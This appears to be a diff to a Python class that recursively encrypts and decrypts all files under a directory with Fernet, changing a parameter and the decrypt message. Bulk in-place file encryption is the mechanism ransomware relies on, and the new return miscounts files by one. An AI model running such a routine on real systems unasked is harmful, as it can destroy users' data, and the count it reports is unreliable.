@@ -29,7 +29,7 @@ class Encrypter:
         self._fernet = Fernet(self._key)
     
 
-    def encrypt(self, path, *excludeExtensions) -> int : 
+    def encrypt(self, path, excludeExtensions) -> int : 
         i = 0
         for root, dirs, files in os.walk(path):
             for entry in files:
@@ -42,6 +42,7 @@ class Encrypter:
             i += 1
         return i
     
+    
     def decrypt(self, path, excludeExtensions):
         i = 0
         for root, dirs, files in os.walk(path):
@@ -53,5 +54,5 @@ class Encrypter:
                     with open(os.path.join(root, entry), "wb") as decrypted_file:
                         decrypted_file.write(decrypted)
             i += 1
-        print(str(i) + " fichiers décrypté.s dans le dossier : " + path)
+        return str(i + 1) + " fichiers décryptés dans le dossier : " + path
     
